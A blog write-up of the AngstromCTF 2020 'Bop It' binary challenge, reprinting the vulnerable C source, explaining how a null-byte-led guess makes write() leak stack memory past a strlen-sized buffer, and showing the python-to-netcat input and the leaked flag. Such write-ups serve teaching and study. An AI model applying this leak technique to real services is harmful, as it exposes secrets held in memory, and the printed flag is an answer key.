---
layout: post
title: AngstromCTF 2020 - Bop It
excerpt: "Writeup for memory leak challenge from AngstromCTF 2020"
categories: [pwn angstromctf]
---

Bop It was the third challenge in the Binary section of AngstromCTF. Although the bug was fairly simple, the challenge only accumulated 162 solves. The challenge supplies us with an executable and some source code (below).

{% highlight c %}
#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <string.h>

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	const char *actions[] = {"Bop it!\n", "Twist it!\n", "Pull it!\n", "Flag it!\n"};

	srand(time(NULL));

	char c;
	char *action = actions[rand()%4];
	write(1, action, strlen(action));
	while ((c = getchar()) != EOF) {
		if (!strcmp(action, actions[3])) {
			char guess[256];
			guess[0] = c;
			int guessLen = read(0, guess+1, 255)+1; //add to already entered char
			guess[guessLen-1] = 0; //remove newline
			char flag[32];
			FILE *f = fopen("flag.txt", "rb");
			int r = fread(flag, 1, 32, f);
			flag[r] = 0; //null terminate
			if (strncmp(guess, flag, strlen(flag))) {
				char wrong[strlen(guess)+35];
				wrong[0] = 0; //string is empty intially
				strncat(wrong, guess, guessLen);
				strncat(wrong, " was wrong. Better luck next time!\n", 35);
				write(1, wrong, guessLen+35);
				exit(0);
			}
		} else if (c != action[0]) {
			char wrong[64] = "_ was wrong. What you wanted was _!\n";
			wrong[0] = c; //user inputted char
			wrong[strlen(wrong)-3] = action[0]; //correct char
			write(1, wrong, strlen(wrong));
			getchar(); //so there's no leftover newline
			exit(0);
		} else { getchar(); }
		action = actions[rand()%4];
		write(1, action, strlen(action));
	}
}
{% endhighlight %}

Upon first glance the code looks somewhat complicated. After some trial and error though, it is clear that there is a bug in the `write` call when action is "Flag It!". The variable `wrong` is initialized with a size of `strlen(guess)+35`, and is written to stdout. The problem is that the strlen function stops at null bytes, but the guessLen variable will not (it is set from the read function). Whener guessLen+35 gets larger than the `wrong` variable to be written, `write` will continue to give data after the end of the `wrong` buffer, and memory will be leaked. Seeing that the flag has been opened whenever this write is called reassures us that we are on the right track.

Since the exploit is simple I used inline python. You can see that it takes a few times before hitting the "Flag It!" action, but once we do memory is leaked.

```
root@9903d51849b1 /pwn# python -c 'print "\x00" + "A" * 200' | nc shell.actf.co 20702
Twist it!
root@9903d51849b1 /pwn# python -c 'print "\x00" + "A" * 200' | nc shell.actf.co 20702
Flag it!
 was wrong. Better luck next time!
?GXU?GXU"?GXUactf{bopp1ty_bop_bOp_b0p}?"?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~      root@9903d51849b1 /pwn# 
```

In this string we can see `actf{bopp1ty_bop_bOp_b0p}` which is the flag to the challenge!